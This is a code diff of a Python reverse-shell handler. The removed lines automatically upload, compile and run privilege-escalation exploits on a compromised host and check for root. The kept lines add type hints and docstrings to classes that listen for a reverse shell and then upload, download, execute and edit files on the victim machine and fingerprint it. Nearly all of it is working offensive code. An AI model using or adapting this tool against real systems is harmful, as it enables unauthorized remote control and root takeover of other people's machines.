@@ -7,68 +7,8 @@ import socket
 import struct
 import random
 import base64
-from time import sleep
-
-def main(port, interface):
-    persistent = False
-    hosts = None
-    sock = None
-
-    if hosts:
-        hosts = hosts.split(",")
-
-    try:
-        sock = Socket(port, interface)
-        sock.listen(hosts)
-        shell = Shell(sock, persistent)
-        print('[+] Identifying privesc capabilities')
-        privesc(sock, shell)
-
-    except KeyboardInterrupt:
-        sock.close()
-
-def privesc(sock, shell):
-    directory = './plugins/privesc/'
-    counter = 1
-    for filename in os.listdir(directory):
-        f = os.path.join(directory, filename)
-        if os.path.isfile(f):
-            print('[+] Uploading privesc script number {}'.format(counter))
-            rsh = RSH(sock)
-            if '.sh' in f:
-                ext = '.sh'
-            elif '.c' in f:
-                ext = '.c'
-            rsh.upload('{0}'.format(f), '/tmp/exploit{0}{1}'.format(counter, ext))
-            sock.send('cd /tmp\n')
-            if ext == '.c':
-                sock.send('gcc exploit{0}{1} -o exploit{0}\n'.format(counter, ext))
-                sock.send('chmod +x /tmp/exploit{0}{1}\n'.format(counter, ext))
-                sock.send('./exploit{0}\n'.format(counter, ext))
-            elif ext == '.sh':
-                sock.send('chmod +x /tmp/exploit{0}{1}\n'.format(counter, ext))
-                sock.send('./exploit{0}{1}\n'.format(counter, ext))
-            sock.send("""/bin/sh -c '[ "$(id)" = "uid=0(root) gid=0(root) groups=0(root)" ] && touch /tmp/valid_root'\n""")
-            sleep(2)
-            if rsh.file_exists('/tmp/valid_root') == True:
-                print('[+] Privesc exploit worked !')
-                sock.send('rm /tmp/valid_root\n')
-                sock.send('rm /tmp/exploit{0}{1}\n'.format(counter, ext))
-                shell.interact()
-                sock.close()
-            else:
-                print("")
-                sock.send('rm /tmp/exploit*\n') 
-            counter += 1
-
-
-def prompt(message):
-    answer = ""
-    while(answer != "Y" and answer != "N"):
-        answer = input(message + " (Y/N): ")
-        answer = answer.upper()
-    return answer == "Y"
-
+from xmlrpc.client import boolean
+import utils
 
 class Socket:
     sock = None
@@ -77,7 +17,7 @@ class Socket:
     port = None
     interface = None
 
-    def __init__(self, port = 0, interface = ""):
+    def __init__(self, port: int = 0, interface: str = ""):
         try:
             self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -90,7 +30,10 @@ class Socket:
             print(err)
             self.close()
     
-    def listen(self, hosts = None):
+    def listen(self, hosts: list = None) -> None:
+        """
+        Handle listener and wait for reverse shell connection
+        """
         try:
             self.sock.listen(1)
             self.interface = self.sock.getsockname()[0]
@@ -117,12 +60,18 @@ class Socket:
             print(err)
             self.close()
 
-    def send(self, message, chunksize = 2048):
+    def send(self, message: str, chunksize: int = 2048) -> None:
+        """
+        Send bytes of data through the socket
+        """
         for chunk in self._chunks(message, chunksize):
             self.conn.send(bytes(chunk, encoding='utf-8'))
         time.sleep(0.1)
 
-    def receive(self, print_output = False, chunksize = 2048):
+    def receive(self, print_output: bool = False, chunksize: int = 2048) -> None:
+        """
+        Receive data from the socket
+        """
         output = ""
 
         try:
@@ -142,7 +91,10 @@ class Socket:
                 print("[!] Error: Connection lost")
                 self.close()
 
-    def close(self, exit = True):
+    def close(self, exit: bool = True) -> None:
+        """
+        Close socket connection
+        """
         try:
             self.sock.close()
             if exit: sys.exit()
@@ -168,19 +120,31 @@ class Shell:
         self.rsh = RSH(sock)
         self.persistent = persistent
 
-    def _has_prompt(self):
+    def _has_prompt(self) -> bool:
+        """
+        Return True if the shell has prompt
+        """
         return self.shell_prompt != "" and any(self.shell_prompt in s for s in Shell.prompts)
 
-    def _get_prompt(self):
+    def _get_prompt(self) -> str :
+        """
+        Return prompt
+        """
         if self._has_prompt():
             return self.shell_prompt
         else:
             return "> "
 
-    def _print_prompt(self):
+    def _print_prompt(self) -> None:
+        """
+        Print prompt
+        """
         sys.stdout.write(self._get_prompt())
 
-    def interact(self):
+    def interact(self) -> None:
+        """
+        Give reverse shell control to the user
+        """
         time.sleep(0.1)
         RSH.help(self)
         RSH.fingerprint(self)
@@ -191,13 +155,18 @@ class Shell:
                 print("[+] Closing shell..")
                 break
 
-    def output(self):
+    def output(self) -> None:
+        """
+        Retrieve the output of the last command
+        """
         self.last_output = self.sock.receive(True)
         if self.last_output != None and self.last_output != "" and self._has_prompt() == False:
             self.shell_prompt = self.last_output[-2:]
 
-    def input(self):
-
+    def input(self) -> None:
+        """
+        Get a command from the user and send it to the distant machine
+        """
         try:
             if (self._has_prompt()):
                 command = input("")
@@ -229,11 +198,13 @@ class Shell:
 class RSH:
     sock = None
 
-    def __init__(self, sock):
+    def __init__(self, sock: sock):
         self.sock = sock
 
-    def shell_dispatch(self, command):
-
+    def shell_dispatch(self, command: str) -> None:
+        """
+        Handle reverse shell specific commands
+        """
         argv = shlex.split(command)
 
         if len(argv) > 1 and argv[1] == "upload":
@@ -285,8 +256,10 @@ class RSH:
 
         print("[!] Error: Unknown command '%s'" % command)
 
-    def help(self, command = None):
-
+    def help(self, command: str = None) -> None:
+        """
+        Print reverse shell help
+        """
         if command != None:
             if command == "exit":
                 print("")
@@ -376,32 +349,55 @@ class RSH:
             print("  rsh fingerprint                            | Fingerprint the remote shell system                ")
             print("")
 
-    def _generate_key(self):
+    def _generate_key(self) -> int:
+        """
+        Return a random int
+        """
         return random.randrange(15000, 9999999999)
 
-    def _generate_tmpname(self, filename):
+    def _generate_tmpname(self, filename: str) -> str:
+        """
+        Generate a random name in /tmp directory
+        """
         return "/tmp/%d-%s" % (self._generate_key(), filename.split('/')[-1])
 
-    def validate_permissions(self, operator, remotefile):
+    def validate_permissions(self, operator: str, remotefile: str) -> str:
+        """
+        Check if the file permissions
+        """
         key = self._generate_key()
         self.sock.send("[ -%s %s ] && echo %d\n" % (operator, remotefile, key))
         output = self.sock.receive(False)
         return str(key) in output or "--debug" in sys.argv
 
-    def is_readable(self, remotefile):
+    def is_readable(self, remotefile: str) -> str:
+        """
+        Check if the file is readable
+        """
         return self.validate_permissions('r', remotefile)
 
-    def is_writable(self, remotefile):
+    def is_writable(self, remotefile: str) -> str:
+        """
+        Check if the file is writable
+        """
         return self.validate_permissions('w', remotefile)
 
-    def is_executable(self, remotefile):
+    def is_executable(self, remotefile: str) -> str:
+        """
+        Check if the file is executable
+        """
         return self.validate_permissions('x', remotefile)
 
-    def file_exists(self, remotefile):
+    def file_exists(self, remotefile: str) -> str:
+        """
+        Check if the file exists
+        """
         return self.validate_permissions('e', remotefile)
 
-    def upload(self, localfile, remotefile = None):
-
+    def upload(self, localfile: str, remotefile: str = None) -> bool:
+        """
+        Upload a file to the distant machine
+        """
         if remotefile == None:
             remotefile = "$(pwd)/" + localfile.split('/')[-1]
             remotedir = "$(pwd)/"
@@ -415,7 +411,7 @@ class RSH:
         print("[+] Checking %s for write permissions.." % remotedir.replace("$(pwd)/", ""))
         if self.is_writable(remotedir):
             if self.file_exists(remotefile) and self.is_writable(remotefile):
-                if not prompt("[?] Remote file %s exists, overwrite?" % remotefile.replace("$(pwd)/", "")):
+                if not utils.prompt("[?] Remote file %s exists, overwrite?" % remotefile.replace("$(pwd)/", "")):
                     print("[-] Aborted file upload.")
                     return False
 
@@ -439,14 +435,16 @@ class RSH:
             print("[+] Successfully uploaded file to %s!" % remotefile.replace("$(pwd)/", ""))
             return True
         else:
-            if prompt("[?] Permission denied, write to /tmp instead?"):
+            if utils.prompt("[?] Permission denied, write to /tmp instead?"):
                 return self.upload(localfile, self._generate_tmpname(localfile))
             else:
                 print("[-] Aborted file upload.")
                 return False
 
-    def download(self, remotefile, localfile = None):
-
+    def download(self, remotefile: str, localfile: str = None) -> None:
+        """
+        Download a file from the distant machine
+        """
         if localfile == None:
             localfile = self._generate_tmpname(remotefile)
 
@@ -471,8 +469,10 @@ class RSH:
         except Exception as err:
             print("[!] Error: %s" % err)
 
-    def execute(self, localfile, params = ""):
-
+    def execute(self, localfile: str, params: str = "") -> None:
+        """
+        Upload a file and execute it on the distant machine
+        """
         remotefile = self._generate_tmpname(localfile)
         if not self.upload(localfile, remotefile):
             print("[!] Failed to execute %s on remote server" % localfile)
@@ -491,8 +491,10 @@ class RSH:
         self.sock.receive()
         return remotefile
 
-    def edit(self, remotefile):
-
+    def edit(self, remotefile: str) -> None:
+        """
+        Download a file from the distant machine, edit it and upload it back
+        """
         localfile = self.download(remotefile, self._generate_tmpname(remotefile))
         if not localfile:
             print("[!] Failed to open %s for editing." % remotefile)
@@ -506,7 +508,10 @@ class RSH:
             print("[!] Failed to edit %s." % remotefile)
             return 
 
-    def fingerprint(self):
+    def fingerprint(self) -> None:
+        """
+        Retrieve and print current user and the OS of the distant machine
+        """
         self.sock.send("id\n")
         print("[+] ID level : %s" % self.sock.receive())
         self.sock.send("systeminfo | findstr /R '^OS name \s*(.*)'\n")
